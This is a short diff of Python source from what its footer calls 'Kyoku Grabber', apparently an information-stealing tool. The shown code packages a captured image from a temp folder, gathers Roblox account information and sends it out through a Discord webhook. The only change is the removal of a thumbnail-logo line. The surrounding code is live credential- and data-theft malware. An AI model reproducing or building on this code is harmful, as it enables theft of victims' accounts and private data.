@@ -439,7 +439,6 @@ class Discord:
         file = File(tempfolder + "\\image.png", filename="image.png")
         embed2.set_image(url="attachment://image.png")
         embed.set_footer(text="Kyoku Grabber | Created By errias")
-        embed.set_thumbnail("https://cdn.discordapp.com/attachments/1083105927906988063/1087773715695153183/kyoku_logo.png")
         self.robloxinfo(webhook)
 
         webhook.send(
